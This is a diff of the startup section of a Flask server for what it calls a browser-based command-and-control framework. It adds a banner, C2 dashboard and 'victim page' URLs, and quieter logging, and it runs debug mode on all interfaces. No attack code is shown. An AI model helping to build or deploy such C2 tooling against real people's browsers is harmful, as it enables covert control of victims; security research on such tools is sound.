@@ -66,17 +66,47 @@ def create_app():
     
     return app
 
-
 if __name__ == '__main__':
+    # Only show startup message once (not on reloader)
+    import sys
+    if os.environ.get('WERKZEUG_RUN_MAIN') != 'true':
+        print("\n")
+        print("\033[91m" + """
+██████╗      ██╗ ██╗██████╗  ██╗    ░█████╗░██████╗░
+██╔══██╗     ██║███║╚════██╗███║    ██╔══██╗╚════██╗
+██████╔╝     ██║╚██║ █████╔╝╚██║    ██║  ╚═╝ █████╔╝
+██╔═══╝ ██   ██║ ██║ ╚═══██╗ ██║    ██║  ██╗██╔═══╝ 
+██║     ╚█████╔╝ ██║██████╔╝ ██║    ╚█████╔╝███████╗
+╚═╝      ╚════╝  ╚═╝╚═════╝  ╚═╝     ╚════╝ ╚══════╝
+        """ + "\033[0m")
+        print("\033[96m" + "=" * 65 + "\033[0m")
+        print("  \033[93m🎯 Browser-Based Command & Control Framework\033[0m")
+        print("  \033[91m💀 For Educational & Authorized Testing Only\033[0m")
+        print("  \033[90m   Created by: Hackin' with PJ131\033[0m")
+        print("\033[96m" + "=" * 65 + "\033[0m")
+        print(f"  \033[92m📊 C2 Dashboard\033[0m    : \033[94mhttps://localhost:5000/c2\033[0m")
+        print(f"  \033[93m🎣 Victim Page\033[0m     : \033[94mhttps://localhost:5000/\033[0m")
+        print(f"  \033[95m⚙️  Service Worker\033[0m  : \033[94mhttps://localhost:5000/sw.js\033[0m")
+        print("\033[96m" + "=" * 65 + "\033[0m")
+        print("  \033[92m[✓]\033[0m VAPID keys loaded")
+        print("  \033[92m[✓]\033[0m Database initialized")
+        print("  \033[92m[✓]\033[0m Server starting...")
+        print("\033[96m" + "=" * 65 + "\033[0m")
+        print("  \033[93m⚠️  Press CTRL+C to stop the server\033[0m")
+        print("\033[96m" + "=" * 65 + "\033[0m")
+        print("\n")
+    
     app = create_app()
     
-    print("\n" + "="*60)
-    print("🔥 PJ131 C2 - Browser Command & Control Server")
-    print("="*60)
-    print(f"📊 Dashboard: http://localhost:5000/c2")
-    print(f"🎯 Victim page: http://localhost:5000/")
-    print(f"🔧 Service Worker: http://localhost:5000/sw.js")
-    print("="*60 + "\n")
-   
-    app.run(host='0.0.0.0', port=5000, debug=True, ssl_context=('cert.pem', 'key.pem'))
-
+    # Run with minimal output
+    import logging
+    log = logging.getLogger('werkzeug')
+    log.setLevel(logging.ERROR)  # Only show errors
+    
+    app.run(
+        host='0.0.0.0',
+        port=5000,
+        debug=True,
+        ssl_context=('cert.pem', 'key.pem'),
+        use_reloader=True
+    )
